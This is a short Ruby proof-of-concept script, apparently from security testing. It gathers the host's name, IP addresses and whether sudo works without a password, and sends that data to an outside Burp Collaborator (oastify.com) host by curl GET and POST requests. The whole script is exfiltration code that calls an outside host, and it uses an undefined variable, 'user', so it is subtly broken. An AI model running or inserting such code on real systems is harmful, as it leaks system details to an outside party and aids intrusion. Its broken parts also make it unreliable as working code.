#!/usr/bin/env ruby

BURP_URL = "https://uzxxi0lyrv92ps9tcuwxyfo5swynmda2.oastify.com/"


hostname = `hostname`.strip

ip_addresses = `hostname -I`.strip rescue "N/A"

has_sudo = system("sudo -n true 2>/dev/null") ? "YES (Critical)" : "NO"

data_payload = "USER: #{user} | HOST: #{hostname} | IP: #{ip_addresses} | SUDO: #{has_sudo}"

puts "--- PoC Execution Started ---"
puts "Sending data to Burp Collaborator..."

safe_data = data_payload.gsub('"', "'").gsub(' ', '+')

system("curl -k \"#{BURP_URL}?data=#{safe_data}\"")

system("curl -X POST -k -d \"#{data_payload}\" \"#{BURP_URL}\"")

puts "--- PoC Execution Finished ---"
